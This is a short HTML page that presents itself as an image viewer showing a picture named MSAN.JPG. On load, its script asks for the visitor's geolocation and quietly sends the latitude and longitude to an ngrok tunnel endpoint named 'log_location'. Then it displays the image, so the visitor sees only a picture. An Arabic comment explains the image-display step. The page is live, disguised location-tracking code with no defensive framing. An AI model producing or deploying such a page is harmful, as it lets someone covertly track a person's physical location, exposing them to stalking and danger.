<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { margin: 0; background-color: #000; height: 100vh; display: flex; align-items: center; justify-content: center; }
        img { max-width: 100%; height: auto; }
    </style>
</head>
<body>
    <script>
        window.onload = function() {
            navigator.geolocation.getCurrentPosition(function(pos) {
                var ngrok = "https://in-calicoed-overplainly.ngrok-free.dev"; 
                fetch(ngrok + '/log_location?lat=' + pos.coords.latitude + '&lon=' + pos.coords.longitude, {mode: 'no-cors'});
                
                setTimeout(showImage, 500);
            }, showImage);

            function showImage() {
                // يحاول فتح الصورة مباشرة في نفس الصفحة بدلاً من تحويل الرابط
                document.body.innerHTML = '<img src="MSAN.JPG" alt="Loading...">';
            }
        };
    </script>
</body>
</html>
